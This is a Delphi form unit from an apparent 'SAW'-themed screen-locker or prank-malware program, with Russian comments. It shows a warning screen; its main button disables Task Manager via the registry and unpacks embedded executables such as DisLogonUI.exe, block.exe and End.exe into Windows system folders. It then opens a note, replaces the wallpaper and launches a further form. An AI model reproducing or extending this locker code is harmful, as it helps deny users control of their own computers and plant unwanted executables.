unit Warning;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ExtCtrls,
  Vcl.WinXCtrls, Vcl.Imaging.jpeg, ShellAPI, Registry, WinProcs;

type
  TForm3 = class(TForm)
    Button1: TButton;
    Button2: TButton;
    RadioButton1: TRadioButton;
    Timer1: TTimer;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Button3: TButton;
    procedure Button2Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Button3Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form3: TForm3;

implementation

uses Starting;

{$R *.dfm}

procedure DisableTaskMgr(Disable: Boolean);
var
  reg: TRegistry;
begin
  reg := TRegistry.Create;
  reg.RootKey := HKEY_CURRENT_USER;
  reg.OpenKey('Software', True);
  reg.OpenKey('Microsoft', True);
  reg.OpenKey('Windows', True);
  reg.OpenKey('CurrentVersion', True);
  reg.OpenKey('Policies', True);
  reg.OpenKey('System', True);
  if Disable then
    reg.WriteString('DisableTaskMgr', '1') //блокиреум
  else
    reg.WriteString('DisableTaskMgr', '0'); //разблокируем
  reg.CloseKey;
end;

procedure SetWallpaper(sWallpaperBMPPath: string; bTile: boolean);
var

  reg: TRegIniFile;
begin
  //     Изменяем ключи реестра
  //     HKEY_CURRENT_USER
  //     Control Panel\Desktop
  //     TileWallpaper (REG_SZ)
  //     Wallpaper (REG_SZ)

  reg := TRegIniFile.Create('Control Panel\Desktop');
  with reg do
  begin
    WriteString('', 'Wallpaper',
      sWallpaperBMPPath);
    if (bTile) then
    begin
      WriteString('', 'TileWallpaper', '1');
    end
    else
    begin
      WriteString('', 'TileWallpaper', '0');
    end;
  end;
  reg.Free;
  // Оповещаем всех о том, что мы изменили системные настройки
  SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, nil, SPIF_SENDWININICHANGE);
end;

procedure Unpackfiles(); //Распаковка файлов
var
res : TResourceStream;
begin
res:=TResourceStream.Create(Hinstance, 'Resource_1', RT_RCDATA);
res.SaveToFile('c:\note.txt');
res:=TResourceStream.Create(Hinstance, 'SawWall', RT_RCDATA);
res.SaveToFile('c:\images.jpg');
res:=TResourceStream.Create(Hinstance, 'JpgImage_1', RT_RCDATA);
res.SaveToFile('c:\windows\saw1.jpg');
res:=TResourceStream.Create(Hinstance, 'JpgImage_2', RT_RCDATA);
res.SaveToFile('c:\windows\saw2.jpg');
res:=TResourceStream.Create(Hinstance, 'JpgImage_3', RT_RCDATA);
res.SaveToFile('c:\windows\saw3.jpg');
res:=TResourceStream.Create(Hinstance, 'JpgImage_4', RT_RCDATA);
res.SaveToFile('c:\windows\saw4.jpg');
res:=TResourceStream.Create(Hinstance, 'JpgImage_5', RT_RCDATA);
res.SaveToFile('c:\windows\saw5.jpg');
res:=TResourceStream.Create(Hinstance, 'JpgImage_6', RT_RCDATA);
res.SaveToFile('c:\windows\saw6.jpg');
res:=TResourceStream.Create(Hinstance, 'JpgImage_7', RT_RCDATA);
res.SaveToFile('c:\windows\saw7.jpg');
res:=TResourceStream.Create(Hinstance, 'Bitmap_7', RT_BITMAP);
res.SaveToFile('c:\windows\saw8.bmp');
res:=TResourceStream.Create(Hinstance, 'Code1', RT_RCDATA);
res.SaveToFile('c:\SAW\1.txt');
res:=TResourceStream.Create(Hinstance, 'Code2', RT_RCDATA);
res.SaveToFile('c:\SAW\2.txt');
res:=TResourceStream.Create(Hinstance, 'Code3', RT_RCDATA);
res.SaveToFile('c:\SAW\3.txt');
res:=TResourceStream.Create(Hinstance, 'Code4', RT_RCDATA);
res.SaveToFile('c:\SAW\4.txt');
res:=TResourceStream.Create(Hinstance, 'Code5', RT_RCDATA);
res.SaveToFile('c:\SAW\5.txt');
res:=TResourceStream.Create(Hinstance, 'Code6', RT_RCDATA);
res.SaveToFile('c:\SAW\6.txt');
res:=TResourceStream.Create(Hinstance, 'Code7', RT_RCDATA);
res.SaveToFile('c:\SAW\7.txt');
res:=TResourceStream.Create(Hinstance, 'Code8', RT_RCDATA);
res.SaveToFile('c:\SAW\8.txt');
res:=TResourceStream.Create(Hinstance, 'Code9', RT_RCDATA);
res.SaveToFile('c:\SAW\9.txt');
res:=TResourceStream.Create(Hinstance, 'Code10', RT_RCDATA);
res.SaveToFile('c:\SAW\10.txt');
res:=TResourceStream.Create(Hinstance, 'Code11', RT_RCDATA);
res.SaveToFile('c:\SAW\11.txt');
res:=TResourceStream.Create(Hinstance, 'Code12', RT_RCDATA);
res.SaveToFile('c:\SAW\12.txt');
res:=TResourceStream.Create(Hinstance, 'Code13', RT_RCDATA);
res.SaveToFile('c:\SAW\13.txt');
res:=TResourceStream.Create(Hinstance, 'Code14', RT_RCDATA);
res.SaveToFile('c:\SAW\14.txt');
res:=TResourceStream.Create(Hinstance, 'Code15', RT_RCDATA);
res.SaveToFile('c:\SAW\15.txt');
res:=TResourceStream.Create(Hinstance, 'LogOn', RT_RCDATA);
res.SaveToFile('c:\windows\DisLogonUI.exe');
res:=TResourceStream.Create(Hinstance, 'Text1', RT_RCDATA);
res.SaveToFile('c:\windows\debug\1.txt');
res:=TResourceStream.Create(Hinstance, 'Text2', RT_RCDATA);
res.SaveToFile('c:\windows\debug\2.txt');
res:=TResourceStream.Create(Hinstance, 'Text3', RT_RCDATA);
res.SaveToFile('c:\windows\debug\3.txt');
res:=TResourceStream.Create(Hinstance, 'Text4', RT_RCDATA);
res.SaveToFile('c:\windows\debug\4.txt');
res:=TResourceStream.Create(Hinstance, 'Text5', RT_RCDATA);
res.SaveToFile('c:\windows\debug\5.txt');
res:=TResourceStream.Create(Hinstance, 'SAWMP3', RT_RCDATA);
res.SaveToFile('c:\a.mp3');
res:=TResourceStream.Create(Hinstance, 'Activate', RT_RCDATA);
res.SaveToFile('c:\windows\DelActivate.exe');
res:=TResourceStream.Create(Hinstance, 'UnblockLogOn', RT_RCDATA);
res.SaveToFile('c:\windows\help\UnLogOn.exe');
res:=TResourceStream.Create(Hinstance, 'block', RT_RCDATA);
res.SaveToFile('c:\windows\debug\block.exe');
res:=TResourceStream.Create(Hinstance, 'ReSAW', RT_RCDATA);
res.SaveToFile('c:\windows\help\ReSAW.exe');
res:=TResourceStream.Create(Hinstance, 'End', RT_RCDATA);
res.SaveToFile('c:\windows\help\End.exe');
res.Free;
end;

procedure TForm3.Button1Click(Sender: TObject);
begin
DisableTaskMgr(true); //Отключение Диспетчера задач
Unpackfiles();
Form3.Hide;
ShellExecute(Handle, 'open',
'c:\windows\notepad.exe', 'c:\note.txt', nil,
SW_SHOWNORMAL);
Sleep(10000);
SetWallpaper('C:\images.jpg',false); //Установка обоев
Form1.Show;
end;

procedure TForm3.Button2Click(Sender: TObject);
begin
ShellExecute(Handle, 'open',
'c:\windows\system32\cmd.exe', '/c rmdir C:\SAW', nil,
SW_HIDE);
Sleep(500);
Application.Terminate;
end;

procedure TForm3.Button3Click(Sender: TObject);
begin
ShellExecute( Handle, 'open', 'www.youtube.com/channel/UCsKC-cU51wQN_jz-jUrzu-A', nil, nil, SW_NORMAL );
end;

procedure TForm3.FormCreate(Sender: TObject);
begin
ShellExecute(Handle, 'open',
'c:\windows\system32\cmd.exe', '/c md C:\SAW', nil,
SW_HIDE);
end;

procedure TForm3.Timer1Timer(Sender: TObject);
begin
if RadioButton1.Checked = true
 then
begin
Button1.Enabled := true;
end;
end;

end.
